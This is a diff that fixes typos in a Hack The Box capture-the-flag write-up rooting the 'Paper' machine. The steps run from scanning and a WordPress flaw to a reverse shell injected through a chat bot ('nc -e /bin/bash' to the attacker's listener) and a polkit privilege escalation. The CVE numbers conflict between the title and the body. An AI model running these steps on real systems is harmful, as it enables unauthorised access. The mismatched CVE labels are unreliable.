@@ -1,11 +1,12 @@
 Paper and cve-2021-3650
-I do htb ctf and I'm tryin' to be better everyday. This time we gonna exploit polkit vulnerability again. Now let cut to the chase and root this server.
+I do htb ctf and I'm tryin' to be better every day. This time we gonna exploit polkit vulnerability again. Now let's cut to the chase and root this server.
 
-+ First thing I always do is nmap to find any possible port open. I use this command with -T5 for insance speed but reduce accuracy -n to skip DNS resolution(translating IP to domain name)
++ First thing I always do is nmap to find any possible port open. I use this command with -T5 for insane speed but reduce accuracy -n to skip DNS resolution(translating IP to the domain name)
   nmap -p- --open -T5 -v -n 10.10.11.143
   1.txt
-+ After this I do a deeper scan with default scanning script to find any insteresting information but It just normal data.
++ After this I do a deeper scan with the default scanning script to find any interesting information but It is just normal data.
   nmap -sCV -p22,80,443  -v -n 10.10.11.143
+  4.txt
 + After this I realize that there is 22, 80, 443 port open so I do curl to collect header information also I do whatweb and collect the same domain name for backend-server that is office.paper
   curl --head 10.10.11.143
   whatweb 10.10.11.143
@@ -13,18 +14,18 @@ I do htb ctf and I'm tryin' to be better everyday. This time we gonna exploit po
 + To access this domain we have to put office.paper domain and 10.10.11.143 ip address into host address folder in order to host this website on our page
   nano /etc/hosts
   9.txt
-+ for couple of minutes wandering around office.paper I find a login section and they use wordpress with version 5.2.3(you can use what web to find out wordpress version)
-  then I use searchsploit and find out it vulnerable to cross-site host modification so go online to search for any information about this security hole.
++ for a couple of minutes wandering around office.paper I find a login section and they use wordpress with version 5.2.3(you can use what web to find out wordpress version)
+  then I use searchsploit and find out it is vulnerable to cross-site host modification so go online to search for any information about this security hole.
   searchsploit wordpress 5.2.3
 + VUL1
-+ So I understand about this security hole. I use searchsploit with -p 47690 to access information about this hole enventually they shows some guilds.
++ So I understand about this security hole. I use searchsploit with -p 47690 to access information about this hole eventually they shows some guilds.
   8.txt
-+ I follow and find some secret chat page link with domain name chat.office.paper(you know what to do). After reading around I find that I can inject a reverse shell with recyle bot by this command. And of course on my computer, I set a shell lister on port 1234 to bind the shell.
++ I follow and find some secret chat page links with domain name chat.office.paper(you know what to do). After reading around I find that I can inject a reverse shell with recycle bot by this command. And of course, on my computer, I set a shell lister on port 1234 to bind the shell.
   running nc -e /bin/bash 10.10.14.9 1234
   chat.png
 + now I got the reverse shell I upload python3 -c 'import pty; pty.spawn("/bin/bash")' to make shell look clearer. then I run linpeas.sh and find out its vulnerable 
-  to cve-2021-4034 and cve-2021-3560 I try to exploit cve-2021-4043 but It seem impossible cuz they fixed it by require root permission to execute invironment variable
-  in UTF convert libary file. So I chose the other one and It works well.
+  to cve-2021-4034 and cve-2021-3560 I try to exploit cve-2021-4043 but It seem impossible cuz they fixed it by requiring root permission to execute the invironment variable
+  in UTF convert library file. So I chose the other one and It works well.
 + I upload the script then give execute permission to the file then execute it. ./s.sh -u=khoi -p=1
 + In final, I change user right to my created user(khoi) with su - khoi type my password in then I successfully run root with my user authority. And yeah we own the server.
   10.txt
